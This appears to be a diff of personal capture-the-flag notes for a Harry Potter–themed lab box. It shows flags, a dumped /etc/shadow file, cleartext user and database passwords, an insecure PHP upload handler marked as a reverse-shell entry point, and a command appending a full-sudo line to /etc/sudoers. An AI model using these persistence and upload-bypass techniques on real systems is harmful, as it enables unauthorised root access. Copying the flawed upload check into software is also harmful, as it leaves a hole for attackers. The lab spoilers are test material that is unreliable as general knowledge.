@@ -79,7 +79,7 @@ THM{Albus_Perciva1_Wu1fric_Brian_Dumb1ed0re}
 
 
 
-#includedir /etc/sudoers.d
+#included in /etc/sudoers.d
 hermoine   ALL=(root) NOPASSWD: /bin/date
 draco   ALL=(root) NOPASSWD: /usr/bin/easy_install
 
@@ -101,62 +101,82 @@ THM{Yeah_1_swallowed_the_sn1tch.}
 
 
 
-
-------------------------------
-
-box was reset 
-
-
-neville:q#j1kki1@7z!hu7fajs46gkdn
-
-
-
-/root/.ssh
-
-no-port-forwarding,no-agent-forwarding,no-X11-forwarding,command="echo 'Please login as the user \"ubuntu\" rather than the user \"root\".';echo;sleep 10" ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCMLOT6NhiqH5Rp36qJt4jZwfvb/H/+YLRTrx5mS9dSyxumP8+chjxkSNOrdgNtZ6XoaDDDikslQvKMCqoJqHqp4jh9xTQTj29tagUaZmR0gUwatEJPG0SfqNvNExgsTtu2DW3SxCQYwrMtu9S4myr+4x+rwQ739SrPLMdBmughB13uC/3DCsE4aRvWL7p+McehGGkqvyAfhux/9SNgnIKayozWMPhADhpYlAomGnTtd8Cn+O1IlZmvqz5kJDYmnlKppKW2mgtAVeejNXGC7TQRkH6athI5Wzek9PXiFVu6IZsJePo+y8+n2zhOXM2mHx01QyvK2WZuQCvLpWKW92eF amiOpenVPN
+echo "neville    ALL=(ALL:ALL) ALL" >> /etc/sudoers
 
 
 
 
-root:$6$Egy5TDYK$GObyNozE9q6eP7fBYcrPHt6H7ghMhMel3hh49jctk397hidclYjJlLqSPVS/GSiwnBqtX8IxgSuem/bD5Tejc1:18511:0:99999:7:::
-daemon:*:18488:0:99999:7:::
-bin:*:18488:0:99999:7:::
-sys:*:18488:0:99999:7:::
-sync:*:18488:0:99999:7:::
-games:*:18488:0:99999:7:::
-man:*:18488:0:99999:7:::
-lp:*:18488:0:99999:7:::
-mail:*:18488:0:99999:7:::
-news:*:18488:0:99999:7:::
-uucp:*:18488:0:99999:7:::
-proxy:*:18488:0:99999:7:::
-www-data:*:18488:0:99999:7:::
-backup:*:18488:0:99999:7:::
-list:*:18488:0:99999:7:::
-irc:*:18488:0:99999:7:::
-gnats:*:18488:0:99999:7:::
-nobody:*:18488:0:99999:7:::
-systemd-timesync:*:18488:0:99999:7:::
-systemd-network:*:18488:0:99999:7:::
-systemd-resolve:*:18488:0:99999:7:::
-systemd-bus-proxy:*:18488:0:99999:7:::
-syslog:*:18488:0:99999:7:::
-_apt:*:18488:0:99999:7:::
-lxd:*:18488:0:99999:7:::
-messagebus:*:18488:0:99999:7:::
-uuidd:*:18488:0:99999:7:::
-dnsmasq:*:18488:0:99999:7:::
-sshd:*:18488:0:99999:7:::
-pollinate:*:18488:0:99999:7:::
-holmes:$6$8xa69uBr$UXUsILVQodzL/opM/i.KhIxU/I2LOdQGWiUSZmb65gav0Y7bxutm/cRgocivM0CeticPjo1HzY72uBYA1uq.p.:18511:0:99999:7:::
-mysql:!:18511:0:99999:7:::
-ftp:*:18511:0:99999:7:::
-neville:$6$ZEriSM6W$V9PAjbAJAIcOgPRS0HSoA5b0kX3aGhGezaBGGvFBN7dYOKCgArjwV4qPogNt2JPpVgsH.GbsLkt2ZhvusKLDE.:18611:0:99999:7:::
-hermoine:$6$ZoQoImj4$JoQOCRnJD87V.4nR62CauHeWXVkKySw13H/602lRZUR2q8q1tSDHYhLhs4lu0VoxCqV.qiayzm38xSXXCUUKP1:18611:0:99999:7:::
-draco:$6$pnbVGqVC$nAA3AVqZuo9GZZJNsXufsYO8A7rPmxtVefyggxEz7Kzr9TJeNSJXVBO6PxjTN7x.LtQEesQKsO2M6wqTt9Vwr/:18611:0:99999:7:::
-harry:$6$YrUEKKY5$Z3U2rSkDpOSv2Zd4KEhkMdwyigOxuyUcVMTGQbL2RzQzKpEQlul4AD7GerZX9m/7BIEzK1mHEsCJJ2HtHh4bk/:18611:0:99999:7:::
-ubuntu:!:18611:0:99999:7:::
+
+
+*possible backdoor via uploading an rshell in the form of a pdf
+
+
+/var/www/mystaticsite/resumetaker.php
+
+<?php
+if($_FILES['uploadedfile']['type'] != "application/pdf") {
+echo "Sorry, we only allow uploading your resumes in magical PDF formats. ";
+
+exit;
+}
+$uploaddir = 'uploads/';
+$uploadfile = $uploaddir.basename($_FILES['uploadedfile']['name']);
+if (copy($_FILES['uploadedfile']['tmp_name'], $uploadfile)) {
+echo "File is valid, and was successfully uploaded.\n";
+} else {
+echo "File uploading failed.\n";
+}
+?>
 
 
 
-*figure out how to get true root
+
+
+
+
+
+/var/www/mymainsite/conn.php
+
+
+
+<?php
+        $servername = "localhost";
+        $username = "root";
+        $password = "neville_was_chosen";
+        $db = "students";
+        $FLAG = "THM{wait-for-your-letter!}";
+
+        $conn = new mysqli($servername, $username, $password, $db);
+
+        // Check connection
+        if ($conn->connect_error) {
+                die("Connection failed");
+        }
+?>
+
+
+
+
+mysql enum:
+
+
+db:students
+table: non_magic
+content: hermoine | @8p9o1yl4f#nd2jk9@d!yfvbs 
+
+
+db:basement
+table:monsters
+content: fluffy | THM{I-can-be-controlled-by-a-harp}
+
+
+
+
+
+
+
+
+*need to crack 
+
+/var/www/mystaticsite/secrets.txt.enc
+U2FsdGVkX18IKhVL9uuuhJZ0EsTy+3wAG/JxTqpEK8YOPFilg30kStwV1o4r4sCz
